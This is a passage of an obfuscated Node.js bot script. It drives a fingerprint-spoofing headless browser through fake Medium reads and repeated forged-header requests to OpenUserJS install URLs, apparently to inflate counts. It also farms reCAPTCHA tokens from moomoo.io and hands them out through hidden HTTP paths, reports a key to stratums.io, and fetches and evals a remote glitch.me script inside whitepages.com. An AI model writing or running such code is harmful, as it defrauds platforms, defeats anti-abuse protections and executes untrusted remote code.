      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + a1(0x7) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    a2(0x6, 'ir9K') + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x383 + 0x1c04 + -0x1f87
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2 * 0xcc + 0x18c8 + -0x698 * 0x4)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * 0x1389 + 0x31d * 0xa + -0x1 * 0xb35), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x23 * 0xa0 + -0x2006 + 0x8e * 0x13), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x3e1 * -0x1 + -0x1276 * -0x1 + -0x1657;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x39 * -0x81 + 0xdf2 + 0xec7; w < getRandomInt(-0x6 * 0x5d6 + 0x2683 + 0x1 * -0x37e, 0xc82 + -0x426 + -0x23 * 0x3d); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0xf581 + 0x7212 + -0x1 * 0x7d33);
        }
      }();
    }, 0x10fe + 0x1 * 0x248d + 0x1 * -0x3527), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1905 + -0x20 * -0xb5 + -0x2fa5 * 0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xe3f + 0x2441 + -0x3280, 0x2 * 0x813 + 0x2 * -0xca9 + 0x1 * 0x95e)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x800 + -0x1 * 0x5775 + 0xc4a5);
    }, -0xe63 * 0x1 + 0x636 + 0x3 * 0x2db), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1 * 0x22a4 + -0x1 * -0x4ed + 0x1db7;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x11 * -0x9f + 0x7fa + -0x6d1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x545 + 0xe14 + -0x1359), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x35c49 + -0x127d93 + 0x23957c);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x12c4 + 0x2121 + -0xdf9 * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1 * 0xcfb + 0x17c + 0xc47);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x6 * -0x3cb + -0x3d * 0x8b + 0x5771);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = c;
  async function f() {
    const a4 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x19f3 + 0xca9 * 0x1 + 0xd4b) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x16 * 0x41 + -0x182d + 0x1298));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x90b + -0x11bd * 0x1 + 0x1ac8, D['indexOf']('\x20'));
        return B ? E['slice'](-0x20c1 + -0x1c10 + 0x3cd1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x4 * -0x5cb + 0xca0 + 0x1 * 0x319c),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x5e * -0x53 + -0x392b + 0xc7 * 0xa3),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': a4(0xf)
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + a5(0x1) + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x20e5 + -0x5 * -0x4f7 + 0x812; k < -0x1e68 + -0x25b7 + -0x4423 * -0x1; k++)
    setTimeout(f, (0x10e72 + 0xa * -0x371 + -0x1 * 0x1a8) * k * getRandomInt(-0x35 * 0x59 + 0x9bd + -0x19 * -0x59, -0x9 * 0x359 + 0x1ba9 + 0x27b));
  setInterval(() => {
    f();
    for (let l = -0xb31 + 0x1043 + -0x512; l < -0x221b + -0x217a + 0x4399; l++)
      setTimeout(f, (0x2 * -0xafe5 + -0x11 * 0x16d9 + 0x3ce93) * l * getRandomInt(0x2 * 0x6bb + 0x866 + 0x175 * -0xf, 0x193e + 0xa * -0x2f7 + -0xd * -0x57));
  }, 0x507cf2 + 0x1 * -0x67ed8d + 0x4e5f1b);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
